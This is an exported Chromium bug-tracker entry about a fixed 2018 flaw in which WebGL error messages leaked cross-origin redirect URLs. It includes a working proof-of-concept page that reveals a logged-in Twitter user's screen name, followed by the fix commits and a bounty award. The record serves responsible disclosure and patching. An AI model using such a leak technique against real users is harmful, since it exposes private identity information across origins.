# Redirect URL leak via error message of WebGL texture

| Field | Value |
|-------|-------|
| **Issue ID** | [40090115](https://issues.chromium.org/issues/40090115) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>SecurityFeature>SameOriginPolicy, Blink>WebGL |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | ma...@gmail.com |
| **Assignee** | cm...@chromium.org |
| **Created** | 2018-01-08 |
| **Bounty** | $2,000.00 |

## Description

UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3314.2 Safari/537.36

Steps to reproduce the problem:
Chrome leaks a redirect URL to external origins via the error messge of WebGL texture.

1. Log in your twitter account. 
2. Go to https://vulnerabledoma.in/chrome_webgl_url_leak.html . This page has following HTML:

<canvas id="canvas"></canvas>
<script>
window.onerror=function(e){
    alert(e);
}
canvas = document.getElementById('canvas');
gl = canvas.getContext("webgl");
texture = gl.createTexture();
img = new Image();
img.onerror = function() { 
    gl.bindTexture(gl.TEXTURE_2D, texture);
    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, img);
}
img.src = "//analytics.twitter.com/accounts";
</script>

3. You can see your username in the alert dialog:

Uncaught DOMException: Failed to execute 'texImage2D' on 'WebGLRenderingContext': The cross-origin image at https://analytics.twitter.com/i/insights/redirect/home?screen_name=[YOUR_TWITTER_ACCOUNT_HERE] may not be loaded.

What is the expected behavior?
The redirect URL should not be included in the error message.

What went wrong?
The redirect URL is included in the error message.

Did this work before? N/A 

Chrome version: 65.0.3314.2  Channel: stable
OS Version: 10.0
Flash Version:

## Timeline

### el...@chromium.org (2018-01-08)

Great bug, thanks!

[Monorail components: Blink>SecurityFeature>SameOriginPolicy Blink>WebGL]

### el...@chromium.org (2018-01-08)

If believe that if we want to expose the full string, we should do so by calling Document::AddConsoleMessage or equivalent directly.


I wonder whether WebGL is the only place this leak exists (e.g. maybe CSP has a similar bug)

### el...@chromium.org (2018-01-08)

RE #2: https://cs.chromium.org/chromium/src/third_party/WebKit/Source/core/workers/WorkerGlobalScope.cpp?l=153&rcl=0aeffba21ac5213b205cfb98b6fc14581b153871 looks potentially suspect as well.

In contrast, we see explicit awareness of this threat in other codepaths, e.g.
https://cs.chromium.org/chromium/src/third_party/WebKit/Source/core/workers/AbstractWorker.cpp?l=58&rcl=0aeffba21ac5213b205cfb98b6fc14581b153871
  // We can safely expose the URL in the following exceptions, as these checks
  // happen synchronously before redirection. JavaScript receives no new
  // information.


### el...@chromium.org (2018-01-08)

[Empty comment from Monorail migration]

### el...@chromium.org (2018-01-10)

[Empty comment from Monorail migration]

### el...@chromium.org (2018-01-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2018-01-10)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/fae4d7b7d7e5c8a04a8b7a3258c0fc8362afa24c

commit fae4d7b7d7e5c8a04a8b7a3258c0fc8362afa24c
Author: Eric Lawrence <elawrence@chromium.org>
Date: Wed Jan 10 23:00:12 2018

Simplify WebGL error message

The WebGL exception message text contains the full URL of a blocked
cross-origin resource. It should instead contain only a generic notice.

Bug: 799847
Cq-Include-Trybots: master.tryserver.chromium.android:android_optional_gpu_tests_rel;master.tryserver.chromium.linux:linux_optional_gpu_tests_rel;master.tryserver.chromium.mac:mac_optional_gpu_tests_rel;master.tryserver.chromium.win:win_optional_gpu_tests_rel
Change-Id: I3a7f00462a4643c41882f2ee7e7767e6d631557e
Reviewed-on: https://chromium-review.googlesource.com/854986
Reviewed-by: Brandon Jones <bajones@chromium.org>
Reviewed-by: Kenneth Russell <kbr@chromium.org>
Commit-Queue: Eric Lawrence <elawrence@chromium.org>
Cr-Commit-Position: refs/heads/master@{#528458}
[modify] https://crrev.com/fae4d7b7d7e5c8a04a8b7a3258c0fc8362afa24c/third_party/WebKit/LayoutTests/http/tests/security/webgl-remote-read-remote-image-blocked-no-crossorigin-expected.txt
[modify] https://crrev.com/fae4d7b7d7e5c8a04a8b7a3258c0fc8362afa24c/third_party/WebKit/Source/modules/webgl/WebGLRenderingContextBase.cpp


### sh...@chromium.org (2018-01-11)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-01-11)

[Empty comment from Monorail migration]

### el...@chromium.org (2018-01-11)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-01-11)

This bug requires manual review: We are only 11 days from stable.
Please contact the milestone owner if you have questions.
Owners: cmasso@(Android), cmasso@(iOS), kbleicher@(ChromeOS), abdulsyed@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### cm...@google.com (2018-01-11)

awhalley@ please take a look!

### aw...@chromium.org (2018-01-11)

First thing Tuesday morning PDT, please check for any crashes/problem reports from Canary. If it looks good then we should merge.

### sh...@chromium.org (2018-01-12)

[Empty comment from Monorail migration]

### el...@chromium.org (2018-01-15)

cmasso: Do I need to wait for an additional "Merge-Approved", or is #13 sufficient? 

### aw...@google.com (2018-01-16)

abdulsyed@ will need to give the merge approval. (Thanks for checking)

### aw...@google.com (2018-01-16)

[Empty comment from Monorail migration]

### ab...@chromium.org (2018-01-16)

Thanks elawrence@ - approving merge for M64. Branch:3282

### bu...@chromium.org (2018-01-16)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/b18672fb63b271a7ebede1e213d83e1e5af129dc

commit b18672fb63b271a7ebede1e213d83e1e5af129dc
Author: Eric Lawrence <elawrence@chromium.org>
Date: Tue Jan 16 20:02:27 2018

Simplify WebGL error message

The WebGL exception message text contains the full URL of a blocked
cross-origin resource. It should instead contain only a generic notice.

Bug: 799847
Cq-Include-Trybots: master.tryserver.chromium.android:android_optional_gpu_tests_rel;master.tryserver.chromium.linux:linux_optional_gpu_tests_rel;master.tryserver.chromium.mac:mac_optional_gpu_tests_rel;master.tryserver.chromium.win:win_optional_gpu_tests_rel
Change-Id: I3a7f00462a4643c41882f2ee7e7767e6d631557e
Reviewed-on: https://chromium-review.googlesource.com/854986
Reviewed-by: Brandon Jones <bajones@chromium.org>
Reviewed-by: Kenneth Russell <kbr@chromium.org>
Commit-Queue: Eric Lawrence <elawrence@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#528458}(cherry picked from commit fae4d7b7d7e5c8a04a8b7a3258c0fc8362afa24c)
Reviewed-on: https://chromium-review.googlesource.com/868831
Reviewed-by: Eric Lawrence <elawrence@chromium.org>
Cr-Commit-Position: refs/branch-heads/3282@{#509}
Cr-Branched-From: 5fdc0fab22ce7efd32532ee989b223fa12f8171e-refs/heads/master@{#520840}
[modify] https://crrev.com/b18672fb63b271a7ebede1e213d83e1e5af129dc/third_party/WebKit/LayoutTests/http/tests/security/webgl-remote-read-remote-image-blocked-no-crossorigin-expected.txt
[modify] https://crrev.com/b18672fb63b271a7ebede1e213d83e1e5af129dc/third_party/WebKit/Source/modules/webgl/WebGLRenderingContextBase.cpp


### el...@chromium.org (2018-01-16)

I've verified the codepath in #3 does not leak the post-redirection URL. 
https://whytls.com/test/webworker.html


### aw...@google.com (2018-01-22)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-01-24)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-01-29)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@google.com (2018-01-29)

Nice one! the VRP panel decided to award $2,000 for this one!

### aw...@chromium.org (2018-01-29)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-03-27)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-04-20)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### aw...@google.com (2018-10-05)

[Empty comment from Monorail migration]

### is...@google.com (2018-10-05)

This issue was migrated from crbug.com/chromium/799847?no_tracker_redirect=1

[Multiple monorail components: Blink>SecurityFeature>SameOriginPolicy, Blink>WebGL]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40090115)*
